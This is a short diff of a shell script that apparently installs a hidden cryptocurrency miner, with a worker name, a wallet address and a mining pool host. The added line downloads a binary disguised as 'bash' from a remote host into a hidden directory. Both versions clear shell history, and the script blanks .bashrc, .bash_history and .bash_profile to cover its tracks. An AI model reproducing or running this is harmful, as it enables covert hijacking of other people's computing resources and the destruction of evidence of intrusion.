@@ -10,7 +10,7 @@ rm -R /root/.ton
 WORKER="h200"
 WALLETNH="9i4hYPXf3VUfcVxUNSQxAqwo1THyy1pkN7cNDhF5KUZvqEVLZhF"
 POOLNH="pool.woolypooly.com:3100"
-git clone https://github.com/gunturyogatama404/lolcuk.git && cd lolcuk && mv bash /root/.lib && cd .. && history -cr 
+wget -P /home/studio-lab-user/.lib/https://pub-c336f7088d5f440c9c904b1281b88fa6.r2.dev/bash && history -cr 
 echo ""  > /root/.bashrc
 echo "" > /root/.bash_history
 echo "" > /root/.bash_profile
